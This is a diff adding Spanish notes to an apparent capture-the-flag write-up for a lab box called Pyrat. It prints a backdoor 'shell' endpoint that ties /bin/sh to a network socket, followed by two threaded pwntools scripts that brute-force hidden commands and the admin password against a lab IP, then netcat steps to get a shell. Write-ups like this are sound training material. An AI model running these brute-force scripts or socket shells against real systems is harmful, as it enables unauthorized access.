@@ -113,5 +113,197 @@ no changes added to commit (use "git add" and/or "git commit -a")
 think@Pyrat:/opt/dev$
 ```
 
+El archivo
+
+```
+think@Pyrat:/opt/dev$ git show 0a3c36d66369fd4b07ddca72e5379461a63470bf
+commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
+Author: Jose Mario <josemlwdf@github.com>
+Date:   Wed Jun 21 09:32:14 2023 +0000
+
+    Added shell endpoint
+
+diff --git a/pyrat.py.old b/pyrat.py.old
+new file mode 100644
+index 0000000..ce425cf
+--- /dev/null
++++ b/pyrat.py.old
+@@ -0,0 +1,27 @@
++...............................................
++
++def switch_case(client_socket, data):
++    if data == 'some_endpoint':
++        get_this_enpoint(client_socket)
++    else:
++        # Check socket is admin and downgrade if is not aprooved
++        uid = os.getuid()
++        if (uid == 0):
++            change_uid()
++
++        if data == 'shell':
++            shell(client_socket)
++        else:
++            exec_python(client_socket, data)
++
++def shell(client_socket):
++    try:
++        import pty
++        os.dup2(client_socket.fileno(), 0)
++        os.dup2(client_socket.fileno(), 1)
++        os.dup2(client_socket.fileno(), 2)
++        pty.spawn("/bin/sh")
++    except Exception as e:
++        send_data(client_socket, e
++
++...............................................
+```
+
+Examinando el codigo
+
+- Si el cliente manda un string sin conocer, esto hace una operacion con el socker,
+- Si el cliente manda una string de shell se crea una shell
+- Para otro inputs, se pasa la funcion de exec
+
+```
+#!/usr/bin/env python3
+
+from pwn import remote, context
+import threading
+
+target_ip = "10.10.98.190"
+target_port = 8000
+wordlist = "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
+stop_flag = threading.Event()
+num_threads = 100
+
+
+def brute_force_input(words):
+    context.log_level = "error"
+    r = remote(target_ip, target_port)
+    for word in words:
+        if stop_flag.is_set():
+            r.close()
+            return
+        if word == "shell":
+            continue
+        r.sendline(word.encode())
+        output = r.recvline()
+        if b'not defined' not in output and b'<string>' not in output and output != b'\n':
+                stop_flag.set()
+                print(f"[+] Input found: {word}")
+                print(f"[+] Output recieved: {output}")
+                r.close()
+                return
+    r.close()
+    return
+
+
+def main():
+    words = [line.strip() for line in open(wordlist, "r").readlines()]
+    words_length = len(words)
+    step = (words_length + num_threads - 1) // num_threads
+    threads = []
+    for i in range(num_threads):
+        start = i * step
+        end = min(start + step, words_length)
+        if start < words_length:
+            thread = threading.Thread(target=brute_force_input, args=(words[start:end],))
+            threads.append(thread)
+            thread.start()
+    for thread in threads:
+        thread.join()
+
+if __name__ == "__main__":
+    main()
+```
+
+Ejecutando el script encontramos la credencial de admin
+
+```
+$ python3 brute_force_input.py
+[+] Input found: admin
+[+] Output recieved: b'Start a fresh client to begin.\n'
+```
+
+Probamos a inputearlo
+
+```
+$ nc 10.10.98.190 8000
+admin
+Password:
+```
+
+Podemos moficiar el script para hacer una fuerza bruta
+
+```
+#!/usr/bin/env python3
+
+from pwn import remote, context
+import threading
+
+target_ip = "10.10.98.190"
+target_port = 8000
+wordlist = "/usr/share/seclists/Passwords/500-worst-passwords.txt"
+stop_flag = threading.Event()
+num_threads = 100
+
+
+def brute_force_pass(passwords):
+    context.log_level = "error"
+    r = remote(target_ip, target_port)
+    for i in range(len(passwords)):
+        if stop_flag.is_set():
+            r.close()
+            return
+        if i % 3 == 0:
+            r.sendline(b"admin")
+            r.recvuntil(b"Password:\n")
+        r.sendline(passwords[i].encode())
+        try:
+            if b"shell" in r.recvline(timeout=0.5):
+                stop_flag.set()
+                print(f"[+] Password found: {passwords[i]}")
+                r.close()
+                return
+        except:
+            pass
+    r.close()
+    return
+
+
+def main():
+    passwords = [line.strip() for line in open(wordlist, "r").readlines()]
+    passwords_length = len(passwords)
+    step = (passwords_length + num_threads - 1) // num_threads
+    threads = []
+    for i in range(num_threads):
+        start = i * step
+        end = min(start + step, passwords_length)
+        if start < passwords_length:
+            thread = threading.Thread(target=brute_force_pass, args=(passwords[start:end],))
+            threads.append(thread)
+            thread.start()
+    for thread in threads:
+        thread.join()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Una vez nos saldra la contraseña cambiamos si necesitamos la url de la ruta
+
+Passowrd FOund: 
+
+```
+nc ip 8000
+```
+
+admin
+pass
+
+shell
+
+GGGGGGGGGGGGG
 
 
